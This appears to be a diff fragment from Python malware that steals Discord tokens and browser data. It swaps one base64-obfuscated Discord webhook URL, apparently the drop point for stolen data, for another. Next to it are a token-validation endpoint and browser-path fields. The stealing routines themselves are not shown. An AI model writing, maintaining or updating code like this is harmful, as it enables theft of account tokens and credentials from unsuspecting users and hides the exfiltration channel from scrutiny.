@@ -83,7 +83,7 @@ class Setup:
     def __init__(self):
         self.__browser = Browser()
         self.__encoder = Encoder()
-        self.__akrt = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW"
+        self.__akrt = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1NzMxOTIwNzc0MzA3OTUwL2lMOWE5X0wzMU9BWnYxRk5lNXQ3UVp6ampzZ2ozSHFhY25TWUNwM0RTWjJEc2h3X2ZuRV9JWDBodVVCdmpXMHFwVEJ6"
         self.__url_check = "https://discord.com/api/v9/users/@me/guilds"
 
         self.__browser_path = [
